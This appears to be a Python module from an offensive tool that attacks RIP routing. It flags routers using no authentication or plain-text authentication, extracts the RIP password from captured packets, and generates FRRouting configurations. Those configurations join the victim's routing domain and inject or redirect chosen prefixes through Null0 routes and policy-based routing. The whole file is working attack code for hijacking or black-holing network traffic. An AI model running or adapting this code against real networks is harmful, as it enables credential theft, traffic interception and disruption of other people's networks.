import sys
sys.path.append("..")
import protocol_parser
import utility
from state import user_var


def detect_if_vulnerable(packet):

    # Version 1 of RIP does not support authentication
    if packet['RIP header'].version == 1:
        return True
    
    # If there is no RIP authentication layer then authentication has not been configured
    elif packet['RIP header'].version == 2 and not packet.haslayer('RIP authentication'):
        return True

    # Version 2 has support for authentication.
    # From IANA
    # 0 None		
    # 1 Authentication Trailer [RFC4822]
    # 2 Plain-text password [RFC1388]	
    # 3 Cryptographic Hash Function [RFC4822]
    elif packet['RIP header'].version == 2 and packet.haslayer('RIP authentication'):
        # I have not seen authtype 0 in use. RFC states 2 is in use for simple/plain text auth. 
        # Updated RFC states crypto auth uses type 3.
        # But should there exist a case where auth type is set to 0, I think we should cater for it.
        if packet['RIPAuth'].authtype == 2 or packet['RIPAuth'].authtype == 0:
            return True
        else:
            return False
    else:
        return False

def get_packet_data(packet):
    sourceMac, sourceIP, destinationMac, destinationIP = protocol_parser.get_data_from_layer_two_and_three(packet)
    
    version = packet['RIP header'].version

    # get the correct different auth types
    authentication_type = 0
    password = ''

    if packet.haslayer('RIP authentication'):
        authentication_type = packet['RIPAuth'].authtype
        password = packet['RIPAuth'].password.decode('UTF-8').rstrip('\x00')

    return sourceMac, sourceIP, destinationMac, destinationIP, authentication_type, password, version

def build_configurations(packet):

    ripd_config = ''
    ripd_config += '!\n'
    ripd_config += 'router rip\n'
    ripd_config += ' network {}/32\n'.format(utility.get_ip_address_from_interface(user_var.interface))

    if user_var.inject_local or user_var.redirect_local:
        ripd_config += ' network 172.17.0.0/16\n'

    ripd_config += ' version {}\n'.format(packet.version)

    staticd_config = ''
    pbrd_config = ''

    if user_var.inject or user_var.redirect:
        count = 0
        # FIXME leaving this here for now
        ripd_config += ' redistribute static\n'
        staticd_config += '!\n'
        pbrd_config += '!\n'
        pbrd_config += 'interface {}\n'.format(user_var.interface)
        pbrd_config += ' pbr-policy PBRMAP\n'

        for ip in user_var.ipaddress:
            # FIXME look into ensuring CIDR is in there.
            staticd_config += 'ip route {} Null0\n'.format(ip)

            count += 1
            pbrd_config += '!\n'
            pbrd_config += 'pbr-map PBRMAP seq {}\n'.format(count)
            pbrd_config += ' match dst-ip {}\n'.format(ip)
            pbrd_config += ' set nexthop {}\n'.format(utility.get_default_gateway())

        for ip in user_var.redirectaddresses:
            # FIXME look into ensuring CIDR is in there.
            staticd_config += 'ip route {} Null0\n'.format(ip)

            count += 1
            pbrd_config += '!\n'
            pbrd_config += 'pbr-map PBRMAP seq {}\n'.format(count)
            pbrd_config += ' match dst-ip {}\n'.format(ip)
            pbrd_config += ' set nexthop {}\n'.format(utility.get_default_gateway())

    # if user_var.inject:
    #     # FIXME leaving this here for now
    #     ripd_config += ' redistribute static\n'
    #     staticd_config += '!\n'
    #     for ip in user_var.ipaddress:
    #         # FIXME look into ensuring CIDR is in there.
    #         staticd_config += 'ip route {} Null0\n'.format(ip)

    ripd_config += '!\n'
    staticd_config += '!\n'

    #if packet.version == 2:
    if packet.authentication_type ==  2:
        ripd_config += '!\n'
        ripd_config += 'interface {}\n'.format(user_var.interface)
        ripd_config += ' ip rip authentication mode text\n'
        ripd_config += ' ip rip authentication string {}\n'.format(packet.password)
        ripd_config += '!\n'

    # FIXME: look into crypto 
    #elif packet.authentication_type ==  3:

    return ripd_config, staticd_config, pbrd_config

def build_peer_zebra_configuration():
    zebrad_config = ''

    count = 0

    counts = []

    if user_var.inject_local or user_var.redirect_local:

        zebrad_config += '!\n'

        for ip in user_var.inject_local_ip_addresses:
            count += 1
            zebrad_config += 'access-list {}0 seq 1 permit {}\n'.format(count, ip)
            counts.append(count)

        for ip in user_var.redirect_local_ip_addresses:
            count += 1
            zebrad_config += 'access-list {}0 seq 1 permit {}\n'.format(count, ip)
            counts.append(count)

        zebrad_config += 'access-list {}0 seq 1 permit any\n'.format(count + 1)
        zebrad_config += '!\n'
        zebrad_config += 'route-map rmap deny 1\n'
        
        for c in counts:
            zebrad_config += ' match ip address {}0\n'.format(c)
        zebrad_config += '!\n'
        zebrad_config += 'route-map rmap permit 2\n'
        zebrad_config += ' match ip address {}0\n'.format(count + 1)
        zebrad_config += '!\n'
        zebrad_config += 'ip protocol rip route-map rmap\n'

    zebrad_config += '!\n'
    return zebrad_config

def build_peer_configuration(packet):

    ripd_config = '!\n'
    ripd_config += 'router rip\n'
    ripd_config += ' network 0.0.0.0/0\n'
    ripd_config += ' version {}\n'.format(packet.version)

    staticd_config = ''

    if user_var.inject_local or user_var.redirect_local:

        ripd_config += ' redistribute static\n'

        staticd_config += '!\n'

        for ip in user_var.inject_local_ip_addresses:
            staticd_config += 'ip route {} Null0\n'.format(ip)

        for ip in user_var.redirect_local_ip_addresses:
            staticd_config += 'ip route {} Null0\n'.format(ip)

    ripd_config += '!\n'
    staticd_config += '!\n'


    return ripd_config, staticd_config
